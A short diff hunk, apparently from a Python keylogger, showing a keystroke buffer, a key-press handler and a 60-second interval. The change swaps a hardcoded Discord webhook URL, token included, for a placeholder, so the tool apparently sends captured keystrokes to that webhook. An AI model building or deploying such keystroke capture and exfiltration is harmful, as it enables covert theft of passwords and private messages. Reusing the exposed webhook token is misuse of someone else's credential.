@@ -5,7 +5,7 @@ import threading
 
 
 keystrokes=""
-WEBHOOK = 'https://discord.com/api/webhooks/905156423116263464/AwvpwkPBc-6Sac9TIrNqwRy-gqeX3j5LUE6PqHqR4X3cG0hrVCm_Ay94Kdfvnh4UAwf1'
+WEBHOOK = 'PASTE_YOUR_WEBHOOK_URL_HERE'
 INTERVALS = 60
 
 def on_press(key):
